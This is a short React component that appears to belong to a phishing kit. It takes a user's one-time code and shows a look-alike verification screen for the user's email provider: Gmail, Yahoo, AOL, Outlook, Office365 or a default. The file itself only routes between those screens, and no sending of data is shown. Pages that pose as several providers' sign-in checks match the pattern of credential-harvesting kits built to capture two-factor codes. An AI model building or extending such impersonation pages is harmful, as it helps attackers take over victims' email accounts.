import React, { useState } from 'react';
import { OtpPageProps } from './otp/otpUtils';
import GmailOtp from './otp/GmailOtp';
import YahooOtp from './otp/YahooOtp';
import AolOtp from './otp/AolOtp';
import OutlookOtp from './otp/OutlookOtp';
import Office365Otp from './otp/Office365Otp';
import DefaultOtp from './otp/DefaultOtp';

const OtpPage: React.FC<OtpPageProps> = ({ onSubmit, isLoading, errorMessage, email, provider, onResend }) => {
  const [otp, setOtp] = useState('');

  const handleOtpComplete = (completedOtp: string) => {
    setOtp(completedOtp);
  };
  
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length >= 6) {
      onSubmit(otp);
    }
  };

  const sharedProps = { email, errorMessage, isLoading, otp, onOtpComplete: handleOtpComplete, onSubmit: handleSubmit };

  switch (provider) {
    case 'Gmail':
      return <GmailOtp {...sharedProps} />;
    case 'Yahoo':
      return <YahooOtp {...sharedProps} onResend={onResend} />;
    case 'AOL':
      return <AolOtp {...sharedProps} onResend={onResend} />;
    case 'Outlook':
      return <OutlookOtp {...sharedProps} onResend={onResend} />;
    case 'Office365':
      return <Office365Otp {...sharedProps} onResend={onResend} />;
    default:
      return <DefaultOtp {...sharedProps} />;
  }
};

export default OtpPage;
